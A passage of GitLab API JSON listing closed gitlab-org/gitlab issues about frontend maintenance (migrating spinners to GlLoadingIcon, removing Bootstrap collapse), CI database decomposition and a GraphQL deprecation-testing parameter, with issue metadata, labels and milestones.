Florian","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/553096/avatar.png","web_url":"https://gitlab.com/markrian"},"type":"ISSUE","assignee":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353766","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353766","notes":"https://gitlab.com/api/v4/projects/278964/issues/353766/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353766/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353766","relative":"#353766","full":"gitlab-org/gitlab#353766"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7628,"epic":{"id":450871,"iid":7628,"title":"Spinners \u003e HAML \u003e Migrate spinner markup to loading_icon helper","url":"/groups/gitlab-org/-/epics/7628","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"on_track"},{"id":102998472,"iid":353749,"project_id":278964,"title":"Make spinners in app/views/groups/_subgroups_and_projects.html.haml Pajamas-compliant","description":"One or more spinners in `app/views/groups/_subgroups_and_projects.html.haml` are not Pajamas-compliant. See the [parent epic](https://gitlab.com/groups/gitlab-org/-/epics/7628) for guidance.","state":"closed","created_at":"2022-02-24T14:52:54.729Z","updated_at":"2022-04-18T11:14:45.377Z","closed_at":"2022-03-28T21:49:54.120Z","closed_by":{"id":5413811,"username":"peterhegman","name":"Peter Hegman","state":"active","avatar_url":"https://secure.gravatar.com/avatar/459d8635e9ab17a052c00ead1d7bf1e6?s=80\u0026d=identicon","web_url":"https://gitlab.com/peterhegman"},"labels":["Deliverable","OKR","SUS::Impacting","auto updated","component:spinner","devops::manage","frontend","group::organization","pajamas::integrate","section::dev","severity::4","type::maintenance","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":5413811,"username":"peterhegman","name":"Peter Hegman","state":"active","avatar_url":"https://secure.gravatar.com/avatar/459d8635e9ab17a052c00ead1d7bf1e6?s=80\u0026d=identicon","web_url":"https://gitlab.com/peterhegman"}],"author":{"id":553096,"username":"markrian","name":"Mark Florian","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/553096/avatar.png","web_url":"https://gitlab.com/markrian"},"type":"ISSUE","assignee":{"id":5413811,"username":"peterhegman","name":"Peter Hegman","state":"active","avatar_url":"https://secure.gravatar.com/avatar/459d8635e9ab17a052c00ead1d7bf1e6?s=80\u0026d=identicon","web_url":"https://gitlab.com/peterhegman"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353749","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353749","notes":"https://gitlab.com/api/v4/projects/278964/issues/353749/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353749/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353749","relative":"#353749","full":"gitlab-org/gitlab#353749"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7628,"epic":{"id":450871,"iid":7628,"title":"Spinners \u003e HAML \u003e Migrate spinner markup to loading_icon helper","url":"/groups/gitlab-org/-/epics/7628","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102998468,"iid":353745,"project_id":278964,"title":"Make spinners in app/views/admin/application_settings/_usage.html.haml Pajamas-compliant","description":"One or more spinners in `app/views/admin/application_settings/_usage.html.haml` are not Pajamas-compliant. See the [parent epic](https://gitlab.com/groups/gitlab-org/-/epics/7628) for guidance.","state":"closed","created_at":"2022-02-24T14:52:54.728Z","updated_at":"2022-11-22T18:59:27.259Z","closed_at":"2022-03-18T16:12:44.569Z","closed_by":{"id":4704683,"username":"justin_ho","name":"Justin Ho Tuan Duong","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4704683/avatar.png","web_url":"https://gitlab.com/justin_ho"},"labels":["OKR","SUS::Impacting","auto updated","component:spinner","devops::manage","frontend","group::foundations","pajamas::integrate","section::dev","severity::4","type::maintenance","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":4704683,"username":"justin_ho","name":"Justin Ho Tuan Duong","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4704683/avatar.png","web_url":"https://gitlab.com/justin_ho"}],"author":{"id":553096,"username":"markrian","name":"Mark Florian","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/553096/avatar.png","web_url":"https://gitlab.com/markrian"},"type":"ISSUE","assignee":{"id":4704683,"username":"justin_ho","name":"Justin Ho Tuan Duong","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4704683/avatar.png","web_url":"https://gitlab.com/justin_ho"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353745","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353745","notes":"https://gitlab.com/api/v4/projects/278964/issues/353745/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353745/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353745","relative":"#353745","full":"gitlab-org/gitlab#353745"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7628,"epic":{"id":450871,"iid":7628,"title":"Spinners \u003e HAML \u003e Migrate spinner markup to loading_icon helper","url":"/groups/gitlab-org/-/epics/7628","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102998478,"iid":353755,"project_id":278964,"title":"Make spinners in app/views/users/_overview.html.haml Pajamas-compliant","description":"One or more spinners in `app/views/users/_overview.html.haml` are not Pajamas-compliant. See the [parent epic](https://gitlab.com/groups/gitlab-org/-/epics/7628) for guidance.","state":"closed","created_at":"2022-02-24T14:52:54.707Z","updated_at":"2022-03-16T00:06:51.265Z","closed_at":"2022-03-11T08:37:27.037Z","closed_by":{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"},"labels":["OKR","SUS::Impacting","auto updated","component:spinner","devops::manage","frontend","group::import","pajamas::integrate","section::dev","severity::4","type::maintenance","workflow::production"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"}],"author":{"id":553096,"username":"markrian","name":"Mark Florian","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/553096/avatar.png","web_url":"https://gitlab.com/markrian"},"type":"ISSUE","assignee":{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353755","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353755","notes":"https://gitlab.com/api/v4/projects/278964/issues/353755/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353755/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353755","relative":"#353755","full":"gitlab-org/gitlab#353755"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7628,"epic":{"id":450871,"iid":7628,"title":"Spinners \u003e HAML \u003e Migrate spinner markup to loading_icon helper","url":"/groups/gitlab-org/-/epics/7628","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102998460,"iid":353737,"project_id":278964,"title":"Make spinners in ee/app/views/shared/issuable/_approver_suggestion.haml Pajamas-compliant","description":"One or more spinners in `ee/app/views/shared/issuable/_approver_suggestion.haml` are not Pajamas-compliant. See the [parent epic](https://gitlab.com/groups/gitlab-org/-/epics/7628) for guidance.","state":"closed","created_at":"2022-02-24T14:52:54.560Z","updated_at":"2022-03-22T05:36:20.055Z","closed_at":"2022-03-22T05:36:20.035Z","closed_by":{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"},"labels":["OKR","SUS::Impacting","auto updated","component:spinner","devops::manage","frontend","group::import","pajamas::integrate","section::dev","severity::4","type::maintenance","workflow::production"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"}],"author":{"id":553096,"username":"markrian","name":"Mark Florian","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/553096/avatar.png","web_url":"https://gitlab.com/markrian"},"type":"ISSUE","assignee":{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353737","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353737","notes":"https://gitlab.com/api/v4/projects/278964/issues/353737/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353737/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353737","relative":"#353737","full":"gitlab-org/gitlab#353737"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7628,"epic":{"id":450871,"iid":7628,"title":"Spinners \u003e HAML \u003e Migrate spinner markup to loading_icon helper","url":"/groups/gitlab-org/-/epics/7628","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102998456,"iid":353733,"project_id":278964,"title":"Make spinners in ee/app/views/projects/_merge_request_status_checks_settings.html.haml Pajamas-compliant","description":"One or more spinners in `ee/app/views/projects/_merge_request_status_checks_settings.html.haml` are not Pajamas-compliant. See the [parent epic](https://gitlab.com/groups/gitlab-org/-/epics/7628) for guidance.","state":"closed","created_at":"2022-02-24T14:52:54.469Z","updated_at":"2022-04-19T16:22:34.681Z","closed_at":"2022-04-19T16:15:48.638Z","closed_by":{"id":10770603,"username":"lmeckley","name":"Laura Meckley","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10770603/avatar.png","web_url":"https://gitlab.com/lmeckley"},"labels":["Category:Purchase","OKR","SUS::Impacting","auto updated","component:spinner","devops::fulfillment","frontend","group::purchase","pajamas::integrate","section::dev","severity::4","type::maintenance","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":10770603,"username":"lmeckley","name":"Laura Meckley","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10770603/avatar.png","web_url":"https://gitlab.com/lmeckley"}],"author":{"id":553096,"username":"markrian","name":"Mark Florian","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/553096/avatar.png","web_url":"https://gitlab.com/markrian"},"type":"ISSUE","assignee":{"id":10770603,"username":"lmeckley","name":"Laura Meckley","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10770603/avatar.png","web_url":"https://gitlab.com/lmeckley"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353733","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353733","notes":"https://gitlab.com/api/v4/projects/278964/issues/353733/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353733/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353733","relative":"#353733","full":"gitlab-org/gitlab#353733"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7628,"epic":{"id":450871,"iid":7628,"title":"Spinners \u003e HAML \u003e Migrate spinner markup to loading_icon helper","url":"/groups/gitlab-org/-/epics/7628","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102996810,"iid":353729,"project_id":278964,"title":"Make spinners in app/assets/javascripts/merge_conflicts/merge_conflict_resolver_app.vue Pajamas-compliant","description":"The spinner in implemented in [~/merge_conflicts/merge_conflict_resolver_app.vue](https://gitlab.com/gitlab-org/gitlab/blob/b43d94824e763e574e64cd80157c6bb235ceef01/app/assets/javascripts/merge_conflicts/merge_conflict_resolver_app.vue#L75-77) is not Pajamas-compliant.\n\nIn fact, the `.spinner` class it relies on no longer exists, so this spinner is _probably_ not visible at all at the moment.\n\nMigrate this spinner to `GlLoadingIcon` by making changes similar to this:\n\n```diff\ndiff --git a/app/assets/javascripts/merge_conflicts/merge_conflict_resolver_app.vue b/app/assets/javascripts/merge_conflicts/merge_conflict_resolver_app.vue\nindex 5fcc778a714..c853e3491ed 100644\n--- a/app/assets/javascripts/merge_conflicts/merge_conflict_resolver_app.vue\n+++ b/app/assets/javascripts/merge_conflicts/merge_conflict_resolver_app.vue\n@@ -1,5 +1,5 @@\n \u003cscript\u003e\n-import { GlSprintf, GlButton, GlButtonGroup } from '@gitlab/ui';\n+import { GlSprintf, GlButton, GlButtonGroup, GlLoadingIcon } from '@gitlab/ui';\n import { mapGetters, mapState, mapActions } from 'vuex';\n import { __ } from '~/locale';\n import FileIcon from '~/vue_shared/components/file_icon.vue';\n@@ -22,6 +22,7 @@ export default {\n   components: {\n     GlButton,\n     GlButtonGroup,\n+    GlLoadingIcon,\n     GlSprintf,\n     FileIcon,\n     DiffFileEditor,\n@@ -72,9 +73,7 @@ export default {\n \u003c/script\u003e\n \u003ctemplate\u003e\n   \u003cdiv id=\"conflicts\"\u003e\n-    \u003cdiv v-if=\"isLoading\" class=\"loading\"\u003e\n-      \u003cdiv class=\"spinner spinner-md\"\u003e\u003c/div\u003e\n-    \u003c/div\u003e\n+    \u003cgl-loading-icon v-if=\"isLoading\" size=\"xl\" /\u003e\n     \u003cdiv v-if=\"hasError\" class=\"nothing-here-block\"\u003e\n       {{ conflictsData.errorMessage }}\n     \u003c/div\u003e\n```\n\n## Notes\n\n- The patch above sets the `size` to `xl`, based on the [documented](https://design.gitlab.com/components/spinner#sizes) use cases for spinner sizes. Use your judgement to determine if another size would be more appropriate.\n- Update tests as appropriate.\n\nIf in doubt, `@mention` a [Foundations team member](https://about.gitlab.com/company/team/?department=ecosystem-foundations-team) for guidance.","state":"closed","created_at":"2022-02-24T14:31:03.363Z","updated_at":"2022-11-22T18:59:32.458Z","closed_at":"2022-03-03T09:40:17.175Z","closed_by":{"id":3732265,"username":"pgascouvaillancourt","name":"Paul Gascou-Vaillancourt","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a190c0b1ff5772c9230b4d9a38ac608?s=80\u0026d=identicon","web_url":"https://gitlab.com/pgascouvaillancourt"},"labels":["OKR","SUS::Impacting","component:spinner","devops::manage","frontend","group::foundations","pajamas::integrate","section::dev","severity::4","type::maintenance","workflow::in review"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":3732265,"username":"pgascouvaillancourt","name":"Paul Gascou-Vaillancourt","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a190c0b1ff5772c9230b4d9a38ac608?s=80\u0026d=identicon","web_url":"https://gitlab.com/pgascouvaillancourt"}],"author":{"id":553096,"username":"markrian","name":"Mark Florian","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/553096/avatar.png","web_url":"https://gitlab.com/markrian"},"type":"ISSUE","assignee":{"id":3732265,"username":"pgascouvaillancourt","name":"Paul Gascou-Vaillancourt","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a190c0b1ff5772c9230b4d9a38ac608?s=80\u0026d=identicon","web_url":"https://gitlab.com/pgascouvaillancourt"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353729","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353729","notes":"https://gitlab.com/api/v4/projects/278964/issues/353729/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353729/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353729","relative":"#353729","full":"gitlab-org/gitlab#353729"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":1030,"epic":{"id":5616,"iid":1030,"title":"Pajamas component: Spinner - Integrate","url":"/groups/gitlab-org/-/epics/1030","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"on_track"},{"id":102967714,"iid":353688,"project_id":278964,"title":"Remove usage of bootstrap \"collapse\" within Geo registry pages","description":"The bootstrap [`data-toggle=\"collapse\"` property](https://getbootstrap.com/docs/4.0/components/collapse/) is used within the following HAML templates:\n\n- `ee/app/views/admin/geo/projects/_registry_failed.html.haml`\n- `ee/app/views/admin/geo/projects/_registry_never.html.haml`\n\nThese both appear to provide an expandable/collapsable section describing lists of errors for the user.\n\nSince we are endeavoring to remove bootstrap's \"collapse\" function from our codebase, these must be refactored to work without it. These could potentially be candidates for use with the `GlAccordion` Vue component, but they could also probably be implemented with a crude page-specific script that adds a click handler to add or remove a class to display hidden content.","state":"closed","created_at":"2022-02-24T05:34:45.025Z","updated_at":"2022-11-22T18:59:38.408Z","closed_at":"2022-05-19T06:39:04.059Z","closed_by":{"id":10539680,"username":"slashmanov","name":"Stanislav Lashmanov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10539680/avatar.png","web_url":"https://gitlab.com/slashmanov"},"labels":["OKR","SUS::Impacting","component:accordion","devops::manage","frontend","group::foundations","pajamas::integrate","section::dev","severity::4","type::maintenance","workflow::in review"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":10539680,"username":"slashmanov","name":"Stanislav Lashmanov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10539680/avatar.png","web_url":"https://gitlab.com/slashmanov"}],"author":{"id":636429,"username":"mikegreiling","name":"Mike Greiling","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/636429/avatar.png","web_url":"https://gitlab.com/mikegreiling"},"type":"ISSUE","assignee":{"id":10539680,"username":"slashmanov","name":"Stanislav Lashmanov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10539680/avatar.png","web_url":"https://gitlab.com/slashmanov"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353688","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353688","notes":"https://gitlab.com/api/v4/projects/278964/issues/353688/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353688/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353688","relative":"#353688","full":"gitlab-org/gitlab#353688"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7625,"epic":{"id":450669,"iid":7625,"title":"Remove usage of bootstrap's \"collapse\" actions","url":"/groups/gitlab-org/-/epics/7625","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102956623,"iid":353647,"project_id":278964,"title":"Make GitLab CI run decomposed only or decomposed by default","description":"Since https://gitlab.com/gitlab-org/gitlab/-/merge_requests/78182 we are now running CI decomposed pipeline with 2 databases. This pipeline is still optional and requires ~\"pipeline:run-decomposed\" to run but we should make it run on all pipelines to avoid regressions and we should probably even go further and not even bother running the non-decomposed pipeline anymore as we assume that if GitLab works with 2 databases it will work with 1. \n\nI'm open to explore whether or not we need to run both but at the least we want decomposed to be run by default so we catch issues earlier and running both always is expensive.","state":"closed","created_at":"2022-02-23T21:24:27.801Z","updated_at":"2022-07-29T21:27:24.079Z","closed_at":"2022-03-21T08:55:26.651Z","closed_by":{"id":128633,"username":"rymai","name":"Rémy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"labels":["Category:Pods","Engineering Productivity","auto updated","ci-decomposition","ci-decomposition::phase6","devops::data_stores","group::pods","section::enablement","type::maintenance","workflow::in dev"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":128633,"username":"rymai","name":"Rémy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"}],"author":{"id":120073,"username":"DylanGriffith","name":"Dylan Griffith","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/120073/avatar.png","web_url":"https://gitlab.com/DylanGriffith"},"type":"ISSUE","assignee":{"id":128633,"username":"rymai","name":"Rémy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"user_notes_count":15,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353647","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353647","notes":"https://gitlab.com/api/v4/projects/278964/issues/353647/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353647/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353647","relative":"#353647","full":"gitlab-org/gitlab#353647"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5840,"epic":{"id":255814,"iid":5840,"title":"Decomposition: Testing and validation strategy","url":"/groups/gitlab-org/-/epics/5840","group_id":9970,"human_readable_end_date":"Jul 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102953039,"iid":353642,"project_id":278964,"title":"Allow GraphQL consumers to execute against schema where deprecations are removed","description":"### About\n\nWe could easily allow GraphQL consumers to test their queries against the future schema with deprecations removed by having the API pass a `param` through to the `context`, and checked for in [`#visible?`](https://graphql-ruby.org/authorization/visibility.html#hiding-parts-of-the-schema) methods of fields, arguments and enum values (the deprecatable schema items).\n\nThis could be a big help for consumers to test their integrations at any time, and ahead of major milestone releases.\n\nWe would document in the client-facing GraphQL docs and encourage this.\n\n### Release Post\n\nThe `?remove_deprecated=true` parameter [adds a new tool to GitLab's GraphQL API](https://docs.gitlab.com/ee/api/graphql/#deprecation-and-removal-process) for analyzing the behavior of your applications and integrations leveraging deprecated fields. In the example below, when the deprecated field `email` is included in the request and the parameter is used within the request URI, the request will fail. \n\n**Request:**\n\n```graphql\n{\n  project(fullPath: \"hail-mary\") {\n    tagList\n  }\n}\n```\n\n**Successful Response:**\n\n```graphql\n{\n    \"data\": {\n        \"project\": {\n            \"tagList\": \"[\\\"rocky\\\"]\"\n        }\n    }\n}\n```\n\n**Failed Response:**\n\n```graphql\n{\n    \"errors\": [\n        {\n            \"message\": \"Field 'tagList' doesn't exist on type 'Project'\",\n            \"locations\": [\n                {\n                    \"line\": 3,\n                    \"column\": 5\n                }\n            ],\n            \"path\": [\n                \"query\",\n                \"project\",\n                \"tagList\"\n            ],\n            \"extensions\": {\n                \"code\": \"undefinedField\",\n                \"typeName\": \"Project\",\n                \"fieldName\": \"tagList\"\n            }\n        }\n    ]\n}\n```","state":"closed","created_at":"2022-02-23T20:11:19.907Z","updated_at":"2022-12-14T21:36:53.211Z","closed_at":"2022-11-10T21:49:44.560Z","closed_by":{"id":10222550,"username":"g.hickman","name":"Grant Hickman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10222550/avatar.png","web_url":"https://gitlab.com/g.hickman"},"labels":["Category:API","Category:Integrations","Community contribution","GitLab Core","GitLab Premium","GitLab 